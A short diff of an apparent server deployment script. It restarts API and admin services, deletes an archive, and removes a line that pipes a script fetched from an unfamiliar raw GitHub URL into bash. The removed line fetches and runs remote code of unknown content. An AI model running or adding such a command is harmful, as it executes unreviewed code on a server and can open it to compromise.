@@ -8,4 +8,3 @@ sudo chmod +x /opt/www/api/bin/app
 sudo systemctl restart wdc-api.service
 sudo systemctl restart wdc-admin.service
 rm -rf /opt/dep/api/app.tar.gz
-curl -fsSL https://raw.githubusercontent.com/wxdxcx/xx/refs/heads/main/dd.sh | bash
